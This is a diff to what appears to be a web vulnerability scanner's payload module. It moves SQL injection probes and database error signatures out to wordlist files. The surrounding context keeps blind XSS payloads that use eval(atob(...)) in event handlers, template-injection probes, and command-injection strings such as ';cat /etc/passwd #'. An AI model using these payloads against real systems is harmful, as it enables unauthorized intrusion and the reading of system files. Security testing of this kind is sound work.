@@ -20,11 +20,7 @@ class XSS:
             self.blind.append(f'"><img src=x id={b}&#61; onerror=eval(atob(this.id))>')
             self.blind.append(f'"><input onfocus=eval(atob(this.id)) id={b}&#61; autofocus>')
 
-sqli_payloads=[
-    '"',
-    "'",
-    '/'
-    ]
+sqli_payloads = open('wordlists/sqli.txt','r')
 
 
 ssti = {
@@ -33,34 +29,8 @@ ssti = {
         'scan${2*5}tr':'scan10tr'
         }
 
-sql_err = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax',
-             'MiscError': 'mysql_fetch',
-             'MiscError2': 'num_rows',
-             'Oracle': 'ORA-01756',
-             'JDBC_CFM': 'Error Executing Database Query',
-             'JDBC_CFM2': 'SQLServer JDBC Driver',
-             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
-             'MSSQL_Uqm': 'Unclosed quotation mark',
-             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
-             'MS-Access_JETdb': 'Microsoft JET Database',
-             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
-             'unkown' : 'Server Error',
-             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
-             'Invalid Querystring' : 'Invalid Querystring',
-             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
-             'VBScript Runtime' : 'VBScript Runtime',
-             'ADODB.Field' : 'ADODB.Field',
-             'BOF or EOF' : 'BOF or EOF',
-             'ADODB.Command' : 'ADODB.Command',
-             'JET Database' : 'JET Database',
-             'mysql_fetch_array()' : 'mysql_fetch_array()',
-             'Syntax error' : 'Syntax error',
-             'mysql_numrows()' : 'mysql_numrows()',
-             'GetArray()' : 'GetArray()',
-             'Fatal error': 'Fatal error',
-             'FetchRow()' : 'FetchRow()',
-             'Input string was not in a correct format' : 'Input string was not in a correct format',
-             'Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}
+sql_err = open('wordlists/sqli_errors.txt','r')
+
 rce_payloads = {
      ';id #':'gid=',
      ';cat /etc/passwd #':'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
